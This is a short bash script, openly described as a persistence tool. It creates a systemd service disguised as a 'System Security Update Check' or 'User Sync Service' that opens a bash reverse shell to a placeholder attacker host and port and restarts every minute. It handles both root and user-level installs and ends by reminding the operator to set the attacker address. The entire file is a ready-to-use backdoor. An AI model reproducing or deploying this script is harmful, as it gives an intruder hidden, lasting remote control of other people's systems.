#!/bin/bash
# -----------------------------------------------------------------------------
# Creates a systemd service (system or user) for persistence.
# -----------------------------------------------------------------------------

SERVICE_NAME="system-update-check.service"
SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"
USER_SERVICE_DIR="$HOME/.config/systemd/user"
USER_SERVICE_PATH="$USER_SERVICE_DIR/$SERVICE_NAME"
PAYLOAD="/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'"

if [ "$(id -u)" -eq 0 ]; then
    echo "[+] Creating System Service (Root)..."
    
    cat <<EOF > "$SERVICE_PATH"
[Unit]
Description=System Security Update Check
After=network.target

[Service]
Type=simple
ExecStart=$PAYLOAD
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

    if [ -f "$SERVICE_PATH" ]; then
        systemctl enable "$SERVICE_NAME" 2>/dev/null
        systemctl start "$SERVICE_NAME" 2>/dev/null
        echo "[+] Service created, enabled, and started at $SERVICE_PATH"
    else
        echo "[-] Failed to create service file."
    fi

else
    echo "[+] Creating User Service..."
    mkdir -p "$USER_SERVICE_DIR"
    
    cat <<EOF > "$USER_SERVICE_PATH"
[Unit]
Description=User Sync Service

[Service]
ExecStart=$PAYLOAD
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [ -f "$USER_SERVICE_PATH" ]; then
        systemctl --user enable "$SERVICE_NAME" 2>/dev/null
        systemctl --user start "$SERVICE_NAME" 2>/dev/null
        echo "[+] User service created, enabled, and started at $USER_SERVICE_PATH"
        echo "[*] Note: User must be logged in (or linger enabled) for this to run."
    else
        echo "[-] Failed to create user service file."
    fi
fi

echo "[*] REMINDER: Edit the service file to set ATTACKER_IP and ATTACKER_PORT!"
